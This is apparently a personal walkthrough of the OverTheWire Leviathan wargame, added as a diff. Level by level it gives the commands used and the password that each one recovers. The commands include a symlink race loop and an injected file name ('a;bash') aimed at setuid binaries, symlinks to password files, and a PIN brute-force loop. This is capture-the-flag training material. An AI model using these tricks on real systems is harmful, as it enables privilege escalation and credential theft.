@@ -1,0 +1,177 @@
+LEVIATHAN
+
+
+SSH Information
+Host: leviathan.labs.overthewire.org
+Port: 2223
+
+Username: leviathan0
+Password: leviathan0
+
+---------------------------------------------------------------
+
+Leviathan Level 0:
+--> There is no information for this level, intentionally.
+
+	login into level0 using using default credentails, always goal is to find password for next 
+	level, so lets make it.
+
+	$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223
+	$ ls      (we don't see any file lets see hidden files)
+	$ ls -la  (here we can see .backup)
+	$ cd .backup (here you can see a bookmarks.html)
+
+	to find flag we need to cat flag and grep output for a password.
+	> cat bookmarks.html | grep password 
+
+> rioGegei8m
+---------------------------------------------------------------
+
+Leviathan Level 0 → Level 1
+-->
+	doing strings on this executable file gives us > it is C or C++ program 
+	lets trace it while execution
+
+	$ ltrace ./check 		(giving input 'qwerty' as password )
+
+	we get output as strcmp("qwe", "sex") < so we can say here strcmp() from C is being used
+	and it compares the password entered by user with 'sex' so we can say password is 'sex' 
+	enter it and we get the bash.
+
+	> now goal is to get flag use the following command to find 'pass' for next level 
+
+	$ ./check (sex)
+
+	$ find / -user leviathan2 2>/dev/null | grep pass
+
+	$ cat /etc/leviathan_pass/leviathan2 		(here we get password for next level)
+
+> ougahZi8Ta
+
+---------------------------------------------------------------
+
+Leviathan Level 1 → Level 2
+--> 	
+	we can see here there is executable binary so called as 'printfile', so we need to think
+	if the this binary printfile gives output whatever we give a file as arguement.
+
+	$ ./printfile /etc/leviathan_pass/leviathan3       (but here we cant see the file ) < so lets bypass this
+
+	$ mkdir /tmp/akash_temp1/
+	$ touch /tmp/temp_file.txt
+	$ while true; do ln -sf /tmp/temp_file.txt /tmp/akash_temp1/password ; ln -sf /etc/leviathan_pass/leviathan3 /tmp/akash_temp1/password; done &
+	$ while true; do ./printfile /tmp/akash_temp/password; done
+
+-----> solution 2
+	$ 	cd /tmp/akash
+	$  	   /tmp/akash$ touch "a;bash"			("a;bash -p")    < to give privilaged mode
+	$      /tmp/akash$ /home/leviathan2/printfile "a;bash"
+
+	NOW YOU ARE LEVIATHAN03 < user so you can cat  /etc/leviathan_pass/leviathan3 file
+	
+
+> Ahdiemoo1j
+
+---------------------------------------------------------------
+
+Leviathan Level 2 → Level 3
+--> 
+
+	here all we need is to understand how this is going to work so when we run executable file we need
+	to trace the file using ltrace
+
+	$ ltrace ./level3 			(enter password lets say here password is "qwerty")
+
+		strcmp("h0no33", "kakaka") 
+		strcmp("qwerty\n", "snlprintf\n")      
+
+		here you can see two strcmp() functions in itself so, lets make understand where our string 
+		is getting compared with what, so we can see the password is "snlprintf"
+
+	$ ./level3 
+	Enter the password> snlprintf
+	[You've got shell]!
+	
+	$ cat /etc/leviathan_pass/leviathan4
+	vuH0coox6m
+
+
+> vuH0coox6m
+ 
+---------------------------------------------------------------
+
+Leviathan Level 3 → Level 4
+-->
+
+	always look for hidden files. here we can seen there is a hidden directory named ".trash"
+
+	$ cd .trash
+	$ ls   (here we can see a executable file named 'bin')
+	$ ./bin  (it gives us a output as binary)
+
+	01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
+
+	lets decode the binary into ASSCI
+	https://www.rapidtables.com/convert/number/binary-to-ascii.html  (here I used this website)
+
+	Tith4cokei  > and you get the password for the next level.
+
+
+> Tith4cokei
+
+
+---------------------------------------------------------------
+
+
+Leviathan Level 4 → Level 5
+-->
+	here we get a executable file lets run it.
+
+	$  ./leviathan5 
+
+	Cannot find /tmp/file.log     (^__* this looks intresting)
+
+	lets make a soft link to the flag.
+
+	$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+
+	$ ./leviathan5    
+
+		UgaoFee4li     (Here we get the flag....!)
+
+> UgaoFee4li
+
+---------------------------------------------------------------
+
+
+Leviathan Level 5 → Level 6
+--> 	
+	here we again got a executable file lets run it ask for 4 digit > code 
+	but we dont have the right value all we can do is just to do brute-force...
+
+	lets use bash_scripting
+
+	$ for i in $(seq 0000 9999); do ./leviathan6 $i ; done | grep -v Wrong
+
+	after sometime you will see you actually got the shell. so lets cat the flag.
+
+	$ cat /etc/leviathan_pass/leviathan7
+
+	> ahy7MaeBo9
+
+> ahy7MaeBo9
+
+
+---------------------------------------------------------------
+
+
+Leviathan Level 6 → Level 7
+--> 	
+	connect using SSH and here you get what you  all wanted.
+
+	CONGRATULATIONS
+
+
+---------------------------------------------------------------
+
+
